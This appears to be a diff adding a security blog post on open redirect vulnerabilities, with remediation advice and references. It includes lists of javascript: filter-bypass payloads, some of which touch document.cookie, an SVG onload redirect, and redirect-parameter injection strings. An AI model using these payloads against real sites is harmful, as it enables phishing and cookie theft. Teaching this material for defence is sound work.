@@ -1,0 +1,219 @@
+---
+title: Open Redirect Vulnerability
+#author: cotes
+date: 2024-01-02 12:00:00 +04:00
+categories: [Web Vulnerabilities,Open Redirect]
+tags: [Web Vulnerabilities]
+render_with_liquid: false
+image:
+  path: /images/web_vulnerabilities/open_redirection/open-redirection.jpg
+  alt: Open Redirect Vulnerability
+---
+
+## What is Open Redirect?
+
+Unvalidated redirects and forwards are possible when a web application accepts untrusted input that could cause the web application to redirect the request to a URL contained within untrusted input. By modifying untrusted URL input to a malicious site, an attacker may successfully launch a phishing scam and steal user credentials.
+
+Because the server name in the modified link is identical to the original site, phishing attempts may have a more trustworthy appearance. Unvalidated redirect and forward attacks can also be used to maliciously craft a URL that would pass the application's access control check and then forward the attacker to privileged functions that they would normally not be able to access. 
+
+## Exploitation
+
+Consider this example: Your web application has a feature that allows users to click a link and be automatically redirected to their saved favorite home page. This may be performed as follows: 
+
+
+  ```console
+https://example.com/redirect?url=https://mywebsite.com
+```
+
+
+An attacker could exploit an open redirect here by replacing the `mywebsite.com` with a link to a malicious website. They could then distribute this link in a phishing email or on another website. When users click the link, they're taken to the malicious website.
+
+
+## Open Redirect to XSS
+
+  ```bash
+#Basic payload, javascript code is executed after "javascript:"
+javascript:alert(1)
+
+#Bypass "javascript" word filter with CRLF
+java%0d%0ascript%0d%0a:alert(0)
+
+#Javascript with "://" (Notice that in JS "//" is a line coment, so new line is created before the payload). URL double encoding is needed
+#This bypasses FILTER_VALIDATE_URL os PHP
+javascript://%250Aalert(1)
+
+#Variation of "javascript://" bypass when a query is also needed (using comments or ternary operator)
+javascript://%250Aalert(1)//?1
+javascript://%250A1?alert(1):0
+
+#Others
+%09Jav%09ascript:alert(document.domain)
+javascript://%250Alert(document.location=document.cookie)
+/%09/javascript:alert(1);
+/%09/javascript:alert(1)
+//%5cjavascript:alert(1);
+//%5cjavascript:alert(1)
+/%5cjavascript:alert(1);
+/%5cjavascript:alert(1)
+javascript://%0aalert(1)
+<>javascript:alert(1);
+//javascript:alert(1);
+//javascript:alert(1)
+/javascript:alert(1);
+/javascript:alert(1)
+\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
+javascript:alert(1);
+javascript:alert(1)
+javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)
+javascript:confirm(1)
+javascript://https://whitelisted.com/?z=%0Aalert(1)
+javascript:prompt(1)
+jaVAscript://whitelisted.com//%0d%0aalert(1);//
+javascript://whitelisted.com?%a0alert%281%29
+/x:1/:///%01javascript:alert(document.cookie)/
+";alert(0);//
+```
+
+## Open Redirect uploading svg files
+
+  ```bash
+<code>
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<svg
+onload="window.location='http://www.example.com'"
+xmlns="http://www.w3.org/2000/svg">
+</svg>
+</code>
+```
+
+
+## Common injection parameters
+
+  ```bash
+/{payload}
+?next={payload}
+?url={payload}
+?target={payload}
+?rurl={payload}
+?dest={payload}
+?destination={payload}
+?redir={payload}
+?redirect_uri={payload}
+?redirect_url={payload}
+?redirect={payload}
+/redirect/{payload}
+/cgi-bin/redirect.cgi?{payload}
+/out/{payload}
+/out?{payload}
+?view={payload}
+/login?to={payload}
+?image_url={payload}
+?go={payload}
+?return={payload}
+?returnTo={payload}
+?return_to={payload}
+?checkout_url={payload}
+?continue={payload}
+?return_path={payload}
+success=https://c1h2e1.github.io
+data=https://c1h2e1.github.io
+qurl=https://c1h2e1.github.io
+login=https://c1h2e1.github.io
+logout=https://c1h2e1.github.io
+ext=https://c1h2e1.github.io
+clickurl=https://c1h2e1.github.io
+goto=https://c1h2e1.github.io
+rit_url=https://c1h2e1.github.io
+forward_url=https://c1h2e1.github.io
+@https://c1h2e1.github.io
+forward=https://c1h2e1.github.io
+pic=https://c1h2e1.github.io
+callback_url=https://c1h2e1.github.io
+jump=https://c1h2e1.github.io
+jump_url=https://c1h2e1.github.io
+click?u=https://c1h2e1.github.io
+originUrl=https://c1h2e1.github.io
+origin=https://c1h2e1.github.io
+Url=https://c1h2e1.github.io
+desturl=https://c1h2e1.github.io
+u=https://c1h2e1.github.io
+page=https://c1h2e1.github.io
+u1=https://c1h2e1.github.io
+action=https://c1h2e1.github.io
+action_url=https://c1h2e1.github.io
+Redirect=https://c1h2e1.github.io
+sp_url=https://c1h2e1.github.io
+service=https://c1h2e1.github.io
+recurl=https://c1h2e1.github.io
+j?url=https://c1h2e1.github.io
+url=//https://c1h2e1.github.io
+uri=https://c1h2e1.github.io
+u=https://c1h2e1.github.io
+allinurl:https://c1h2e1.github.io
+q=https://c1h2e1.github.io
+link=https://c1h2e1.github.io
+src=https://c1h2e1.github.io
+tc?src=https://c1h2e1.github.io
+linkAddress=https://c1h2e1.github.io
+location=https://c1h2e1.github.io
+burl=https://c1h2e1.github.io
+request=https://c1h2e1.github.io
+backurl=https://c1h2e1.github.io
+RedirectUrl=https://c1h2e1.github.io
+Redirect=https://c1h2e1.github.io
+ReturnUrl=https://c1h2e1.github.io
+```
+
+
+## Safe URL Redirects
+
+When we want to redirect a user automatically to another page (without an action of the visitor such as clicking on a hyperlink) you might implement a code such as the following:
+
+
+**PHP**
+
+```bash
+<?php
+/* Redirect browser */
+header("Location: http://www.mysite.com");
+/* Exit to prevent the rest of the code from executing */
+exit;
+?>
+```
+
+**ASP .NET**
+
+```bash
+Response.Redirect("~/folder/Login.aspx")
+```
+
+**Java**
+
+```bash
+response.sendRedirect("http://www.mysite.com");
+```
+
+## Remediation
+
+- If possible, applications should avoid incorporating user-controllable data into redirection targets. In many cases, this behavior can be avoided in two ways:
+  - Remove the redirection function from the application, and replace links to it with direct links to the relevant target URLs.
+  - Maintain a server-side list of all URLs that are permitted for redirection. Instead of passing the target URL as a parameter to the redirector, pass an index into this list.
+
+- If it is considered unavoidable for the redirection function to receive user-controllable input and incorporate this into the redirection target, one of the following measures should be used to minimize the risk of redirection attacks:
+  - The application should use relative URLs in all of its redirects, and the redirection function should strictly validate that the URL received is a relative URL.
+  - The application should use URLs relative to the web root for all of its redirects, and the redirection function should validate that the URL received starts with a slash character. It should then prepend http://yourdomainname.com to the URL before issuing the redirect.
+  - The application should use absolute URLs for all of its redirects, and the redirection function should verify that the user-supplied URL begins with http://yourdomainname.com/ before issuing the redirect.
+
+
+
+
+
+## References
+
+[**OWASP**](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)
+
+[**Hacktricks**](https://book.hacktricks.xyz/pentesting-web/open-redirect)
+
+[**Pentester**](https://pentester.land/blog/open-redirect-cheatsheet/)
+
+[**Acunetix**](https://www.acunetix.com/vulnerabilities/web/open-redirection/)
